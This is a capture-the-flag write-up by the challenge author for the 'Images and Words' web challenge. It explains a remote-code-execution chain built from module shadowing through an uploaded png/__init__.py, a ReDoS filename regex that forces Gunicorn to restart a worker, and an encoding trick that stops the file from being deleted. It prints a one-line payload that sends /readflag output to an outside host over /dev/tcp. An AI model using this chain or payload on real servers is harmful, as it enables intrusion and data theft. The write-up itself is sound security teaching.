## Challenge Information

- Name: Images and Words  
- Type: Web + Misc  
- Description:

```  
BGM: [Dream Theater - Images and
Words](https://www.youtube.com/watch?v=MkLIJw-fOIQ&list=PL8ANB2FxMC6WnDQDe_MS-
OioyR5GEgEvC)  
```

- Files provided: All the files under `docker/zeus/app_scaffold/`  
- Solves: 0 / 720

## Build

```  
docker-compose build  
docker-compose up

# attach bash for debugging  
docker ps  
docker exec -it <CONTAINER ID> bash  
```

## Writeup

This web application will render a text file to a PNG image using
[pypng](https://github.com/drj11/pypng) library. The user can upload a text
file under directory `png`.

The key is to identify the package name `png` happens to be the same as the
upload directory name. Therefore, if the directory `png` exists, `import png`
will not import the module `pypng`, but `png` in current working directory.

Thus, we can upload the python file named `__init__.py`:

```python  
__import__('os').system('bash -c "/readflag>/dev/tcp/bookgin.tw/80"')  
```

However, because the web server is using Gunicorn. Gunicorn uses pre-fork
worker model to launch workers. The pypng module has already been loaded.
Unless we manually reload it or restart the python process, it will not import
the file under `png` in current work directory.

In fact, Gunicorn will monitor its worker processes. If the worker is not
responsive or stuck somehow, by default [it will await 30
seconds](http://docs.gunicorn.org/en/stable/settings.html#timeout) and then
restart the worker. You can notice the process id here is different.

```  
[2019-10-07 12:36:04 +0800] [23271] [INFO] Starting gunicorn 19.9.0  
[2019-10-07 12:36:04 +0800] [23271] [INFO] Listening at: http://127.0.0.1:8080
(23271)  
[2019-10-07 12:36:04 +0800] [23271] [INFO] Using worker:
uvicorn.workers.UvicornWorker  
[2019-10-07 12:36:04 +0800] [23274] [INFO] Booting worker with pid: 23274  
[2019-10-07 12:36:04 +0800] [23274] [INFO] Started server process [23274]  
[2019-10-07 12:36:04 +0800] [23274] [INFO] Waiting for application startup.  
[2019-10-07 12:37:05 +0800] [23271] [CRITICAL] WORKER TIMEOUT (pid:23274)  
[2019-10-07 12:37:06 +0800] [23825] [INFO] Booting worker with pid: 23825  
[2019-10-07 12:37:06 +0800] [23825] [INFO] Started server process [23825]  
[2019-10-07 12:37:06 +0800] [23825] [INFO] Waiting for application startup.  
```

Hence we have to find an approach to make the server stuck for more than 30
seconds. The server source code strictly truncates the filename and file
content. Nginx also has also been set a limitation 1M for the uploaded file
size. It's too difficult to upload a huge file to make the server stuck.
However, in this function:

```python  
def sanitize_filename(dangerous_filename):  
   print(len(dangerous_filename))  
   res = re.match(r'^[\.a-zA-Z0-9_-]([\.a-zA-Z0-9_-]+)*$', dangerous_filename)  
   safe_filename = secrets.token_urlsafe(32)[:32] if res is None else
dangerous_filename  
   return safe_filename  
```

The regular expression is vulnerable to
[ReDoS](https://en.wikipedia.org/wiki/ReDoS). If we have a file named
`aaaaaaaaaaaaaaaaaaaaaa!`, the regular expression will backtrack for a large
number of matches. You could try this payload in
[regex101](https://regex101.com/r/61PZxD/2). By exploiting this we can make
Gunicorn restart the worker process and load our malicious `png/__init__.py`.

One more thing: the server will remove the uploaded text file.

```python  
def render(filename):  
   src = config.UPLOAD_DIR / filename  
   with open(src, 'r') as f:  
       text = f.read()  
   src.unlink()  
   dst = config.UPLOAD_DIR / (filename + '.png')  
   with open(dst, 'wb') as f:  
       text2image.render(text, f)  
```

To exploit, we can upload a non-UTF-8 Python file with [explicit declaration
of encoding](https://www.python.org/dev/peps/pep-0263/#id8). Because this line
`with open(src, 'r') as f:` does not specify the encoding, it will fail to
decode as UTF-8 and throw an exception. Thus the file will not be deleted.
Race condition should also work here but it's less stable. The full exploit is
in the `exploit` directory.

## Postscript

One day I was writing some Python code, and the directory name happened to
conflict with a package name. Then I came out with this idea. For the Gunicorn
part, I just need some execution which will take a long time. ReDoS (in fact I
heard this on a USENIX conference) quickly flashed through my mind.

Although some techniques seem less useful regarding exploitation, sometimes it
becomes a very important part in the RCE chain.

I hope this is a not-so-crafted challenge and hope you enjoy it!  

Original writeup (https://github.com/BookGin/my-ctf-
challenges/tree/master/balsn-ctf-2019/images-and-words).